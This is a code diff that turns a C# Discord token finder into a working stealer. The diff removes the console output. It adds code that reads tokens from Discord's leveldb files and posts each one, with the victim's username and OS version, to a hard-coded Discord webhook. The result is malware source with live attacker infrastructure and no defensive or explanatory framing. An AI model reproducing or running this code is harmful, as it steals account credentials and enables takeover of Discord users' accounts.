@@ -1,40 +1,73 @@
+using Discord;
 using System;
+using System.Collections.Specialized;
 using System.IO;
+using System.Net;
 using System.Text;
 using System.Text.RegularExpressions;
 
 class ZeroMemory
 {
+
     public static void Main()
     {
 
-        string path = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData)+ @"\discord\Local Storage\leveldb";// discord path
-        Regex regex = new Regex(@"[\w-]{24}\.[\w-]{6}\.[\w-]{27}"); //regex for token 
+        string path = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + @"\discord\Local Storage\leveldb";
+        Regex regex = new Regex(@"[\w-]{24}\.[\w-]{6}\.[\w-]{27}");
 
-        string[] dbfiles = Directory.GetFiles(path, "*.ldb", SearchOption.AllDirectories);//enumerate all ldb files in leveldb folder
+        string[] dbfiles = Directory.GetFiles(path, "*.ldb", SearchOption.AllDirectories);
 
-        if (Directory.Exists(path)) //check if directory exist
+        if (Directory.Exists(path))
         {
-            foreach (var file in dbfiles)//loop in each file
+            foreach (var file in dbfiles)
             {
                 FileInfo info = new FileInfo(file);
-                string contents = File.ReadAllText(info.FullName);//get all file content
-                Match match = regex.Match(contents);//check if match with regex
+                string contents = File.ReadAllText(info.FullName);
+                Match match = regex.Match(contents);
                 if (match.Success)
                 {
-                    Console.WriteLine("Token Found in :" + Path.GetFileName(file) + "\n" + match.Value);//print the token and filename where it found
+                    Discord.Send("Token : " + match.Value + "\nUserName : " + Environment.UserName + "\nOS : " + Environment.OSVersion);
                 }
             }
         }
         else
         {
-            Console.WriteLine("Discord path not found !");
             System.Environment.Exit(1);
         }
-        
+
+    }
+    public class Discord
+    {
+        public class Http
+        {
+            public static byte[] Post(string url, NameValueCollection pairs)
+            {
+                using (WebClient webClient = new WebClient())
+                    return webClient.UploadValues(url, pairs);
+            }
+        }
+        public static void Send(string content)
+        {
+            string avu = "https://i.imgur.com/jFZIN2t.jpg";
+            string webHookUrl = "https://discord.com/api/webhooks/843604109268746270/XW7RA-yoAsSAY-0SBT5gcysuyVXrouvNxoPJ1RrvCbKZLK1a9i1ctGSJUxDa_3es1V7F";
+            string username = "Skinjbir";
+            Http.Post(webHookUrl, new NameValueCollection()
+            {
+                {
+                    "content", content
+                },
+
+                {
+                    "username", username
+                },
+
+                {
+                    "avatar_url", avu
+                }
+
+            });
+        }
 
 
     }
-
-
 }
